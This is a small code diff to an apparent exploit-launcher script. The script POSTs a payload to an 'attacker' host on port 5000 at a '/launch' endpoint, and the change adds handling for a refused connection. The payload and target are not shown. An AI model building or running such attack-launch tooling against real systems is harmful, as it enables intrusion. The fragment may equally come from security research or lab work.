@@ -46,13 +46,17 @@ def main(attack_vector: str) -> None:
     headers['Content-Type'] = 'application/json'
     headers['Accepts-Type'] = '*/*'
 
-    resp = requests.post(f'http://{attacker}:5000/launch', data=payload)
-    if resp.status_code == 200:
-        print('Exploit Successfully Launched!\n')
-        sys.exit(0)
-    else:
-        print('Could not Launch Exploit!\n')
-        sys.exit(0)
+    try:
+        resp = requests.post(f'http://{attacker}:5000/launch', data=payload)
+        if resp.status_code == 200:
+            print('Exploit Successfully Launched!\n')
+            sys.exit(0)
+        else:
+            print('Could not Launch Exploit!\n')
+            sys.exit(0)
+    except ConnectionRefusedError as cre:
+        print('Could not connect to attacker instance!')
+        sys.exit(1)
 
 
 if __name__ == '__main__':
